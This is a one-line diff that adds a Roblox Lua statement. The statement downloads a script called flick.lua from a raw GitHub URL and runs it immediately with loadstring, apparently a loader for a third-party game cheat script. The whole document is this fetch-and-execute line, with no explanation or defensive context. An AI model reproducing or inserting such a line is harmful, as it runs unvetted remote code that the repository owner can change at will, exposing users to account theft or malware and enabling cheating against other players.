@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/676767rickroll676767-boop/-/refs/heads/main/flick.lua"))()
